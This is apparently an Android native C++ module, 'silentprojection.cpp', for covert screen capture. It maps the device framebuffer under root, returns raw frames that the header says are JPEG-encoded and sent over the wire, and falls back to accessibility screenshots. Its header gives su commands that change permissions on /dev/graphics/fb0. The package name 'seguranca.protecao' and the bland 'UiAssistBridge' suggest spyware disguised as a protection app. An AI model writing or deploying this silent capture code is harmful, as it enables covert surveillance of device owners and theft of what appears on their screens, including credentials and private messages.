/**
 * silentprojection.cpp
 *
 * Native layer for silent screen capture.
 *
 * ── Two paths ────────────────────────────────────────────────────────
 *
 *   ROOT PATH (nativeGetFrameBuffer):
 *     Opens /dev/graphics/fb0 with O_RDONLY.
 *     Reads vscreen/fixscreen info via FBIOGET_VSCREENINFO / FBIOGET_FSCREENINFO.
 *     mmap()'s the framebuffer.
 *     Returns a jbyteArray structured as:
 *       [ 4B: width ][ 4B: height ][ 4B: bits_per_pixel ][ 4B: line_length ][ raw pixels ]
 *     The Java side (UiAssistBridge) interprets the BPP field to convert
 *     RGB565 / RGBX8888 / BGRA8888 to JPEG before sending over the wire.
 *
 *   FALLBACK (nativeInit returns 0):
 *     Java uses AccessibilityService.takeScreenshot() (Android 11+) or
 *     MediaProjection (with user consent) instead.
 *
 * ── Permissions needed for root path ─────────────────────────────────
 *   su -c "chmod 660 /dev/graphics/fb0"
 *   su -c "chown root:graphics /dev/graphics/fb0"
 *   (handled by PermissionGranter.grantFramebufferAccess() if root present)
 *
 * ── Build ─────────────────────────────────────────────────────────────
 *   CMakeLists.txt already references this file.
 *   ABIs: armeabi-v7a, arm64-v8a (set in build.gradle ndk.abiFilters).
 */

#include <jni.h>
#include <android/log.h>

#include <cerrno>
#include <cstring>
#include <cstdlib>
#include <cstdint>

#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/fb.h>

#define LOG_TAG  "SilentProjection"
#define LOGI(...)  __android_log_print(ANDROID_LOG_INFO,  LOG_TAG, __VA_ARGS__)
#define LOGE(...)  __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

static const char* const FB_DEVICE    = "/dev/graphics/fb0";
static const char* const FB_DEVICE_1  = "/dev/fb0";          // fallback path on some ROMs
static const size_t      MAX_FB_BYTES = 64 * 1024 * 1024;    // sanity cap: 64 MiB

// Header layout prepended to the pixel data in the returned byte array.
// Java-side: ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN)
struct FrameHeader {
    uint32_t width;
    uint32_t height;
    uint32_t bits_per_pixel;
    uint32_t line_length;      // bytes per row (may include padding)
    uint32_t xoffset;          // virtual screen x-pan (usually 0)
    uint32_t yoffset;          // virtual screen y-pan (usually 0)
};

static_assert(sizeof(FrameHeader) == 24, "FrameHeader must be 24 bytes");

static int open_fb() {
    int fd = open(FB_DEVICE, O_RDONLY | O_CLOEXEC);
    if (fd < 0) fd = open(FB_DEVICE_1, O_RDONLY | O_CLOEXEC);
    return fd;
}

extern "C" {

/**
 * nativeInit()
 *
 * Returns:
 *   1  — root framebuffer available; Java should prefer native path.
 *   0  — framebuffer not accessible; Java must use Accessibility / MediaProjection.
 */
JNIEXPORT jint JNICALL
Java_com_seguranca_protecao_UiAssistBridge_nativeInit(JNIEnv* /*env*/, jclass /*clazz*/) {
    const int fd = open_fb();
    if (fd < 0) {
        LOGI("nativeInit: /dev/graphics/fb0 not accessible (errno=%d) — using Java fallback", errno);
        return 0;
    }

    // Quick probe: try reading vscreen info
    struct fb_var_screeninfo vinfo{};
    const int ok = (ioctl(fd, FBIOGET_VSCREENINFO, &vinfo) == 0);
    close(fd);

    if (!ok || vinfo.xres == 0 || vinfo.yres == 0) {
        LOGI("nativeInit: framebuffer inaccessible or zero dimensions — Java fallback");
        return 0;
    }

    LOGI("nativeInit: native framebuffer ready (%ux%u %ubpp)", vinfo.xres, vinfo.yres, vinfo.bits_per_pixel);
    return 1;
}

/**
 * nativeGetFrameBuffer()
 *
 * Reads one frame from the hardware framebuffer.
 *
 * Returns:
 *   jbyteArray  [ FrameHeader (24 bytes) | raw pixel data ]
 *   null        if the framebuffer is not accessible or read fails.
 *
 * The Java caller inspects bits_per_pixel to choose the correct
 * Bitmap.Config / ColorSpace before JPEG-encoding:
 *   16  → RGB_565
 *   24  → RGB_888  (rare; usually 32 with padding byte)
 *   32  → ARGB_8888 or RGBX_8888 (check red/blue offset fields if needed)
 */
JNIEXPORT jbyteArray JNICALL
Java_com_seguranca_protecao_UiAssistBridge_nativeGetFrameBuffer(JNIEnv* env, jclass /*clazz*/) {
    const int fd = open_fb();
    if (fd < 0) {
        LOGD("nativeGetFrameBuffer: fb open failed (errno=%d)", errno);
        return nullptr;
    }

    struct fb_var_screeninfo vinfo{};
    struct fb_fix_screeninfo finfo{};

    if (ioctl(fd, FBIOGET_VSCREENINFO, &vinfo) != 0) {
        LOGE("nativeGetFrameBuffer: FBIOGET_VSCREENINFO failed (errno=%d)", errno);
        close(fd); return nullptr;
    }
    if (ioctl(fd, FBIOGET_FSCREENINFO, &finfo) != 0) {
        LOGE("nativeGetFrameBuffer: FBIOGET_FSCREENINFO failed (errno=%d)", errno);
        close(fd); return nullptr;
    }

    // Validate dimensions
    if (vinfo.xres == 0 || vinfo.yres == 0 || finfo.line_length == 0) {
        LOGE("nativeGetFrameBuffer: zero dimensions (%ux%u line=%u)",
             vinfo.xres, vinfo.yres, finfo.line_length);
        close(fd); return nullptr;
    }

    // Calculate frame size for the visible area only
    const size_t frameBytes = static_cast<size_t>(finfo.line_length) * vinfo.yres;
    if (frameBytes == 0 || frameBytes > MAX_FB_BYTES) {
        LOGE("nativeGetFrameBuffer: suspicious frame size %zu bytes", frameBytes);
        close(fd); return nullptr;
    }

    // mmap the framebuffer — read-only, shared
    void* const fbMap = mmap(nullptr, frameBytes, PROT_READ, MAP_SHARED, fd, 0);
    if (fbMap == MAP_FAILED) {
        LOGE("nativeGetFrameBuffer: mmap failed (errno=%d)", errno);
        close(fd); return nullptr;
    }

    // Build the header
    FrameHeader hdr{};
    hdr.width           = vinfo.xres;
    hdr.height          = vinfo.yres;
    hdr.bits_per_pixel  = vinfo.bits_per_pixel;
    hdr.line_length     = finfo.line_length;
    hdr.xoffset         = vinfo.xoffset;
    hdr.yoffset         = vinfo.yoffset;

    // Allocate output: header + raw pixels
    const size_t totalBytes = sizeof(FrameHeader) + frameBytes;
    jbyteArray result = env->NewByteArray(static_cast<jsize>(totalBytes));
    if (!result) {
        LOGE("nativeGetFrameBuffer: NewByteArray(%zu) failed (OOM?)", totalBytes);
        munmap(fbMap, frameBytes); close(fd); return nullptr;
    }

    // Copy header then pixel data
    env->SetByteArrayRegion(result, 0,
        static_cast<jsize>(sizeof(FrameHeader)),
        reinterpret_cast<const jbyte*>(&hdr));

    env->SetByteArrayRegion(result,
        static_cast<jsize>(sizeof(FrameHeader)),
        static_cast<jsize>(frameBytes),
        static_cast<const jbyte*>(fbMap));

    munmap(fbMap, frameBytes);
    close(fd);

    LOGD("nativeGetFrameBuffer: captured %ux%u %ubpp (%zu bytes)",
         hdr.width, hdr.height, hdr.bits_per_pixel, totalBytes);
    return result;
}

/**
 * nativeIsRootFbAvailable()
 *
 * Lightweight re-check — called by UiAssistBridge.startCapture() to decide
 * which path to activate without doing the full nativeInit() handshake again.
 */
JNIEXPORT jboolean JNICALL
Java_com_seguranca_protecao_UiAssistBridge_nativeIsRootFbAvailable(JNIEnv* /*env*/, jclass /*clazz*/) {
    const int fd = open_fb();
    if (fd < 0) return JNI_FALSE;
    struct fb_var_screeninfo vinfo{};
    const jboolean ok = (ioctl(fd, FBIOGET_VSCREENINFO, &vinfo) == 0 &&
                         vinfo.xres > 0 && vinfo.yres > 0) ? JNI_TRUE : JNI_FALSE;
    close(fd);
    return ok;
}

} // extern "C"
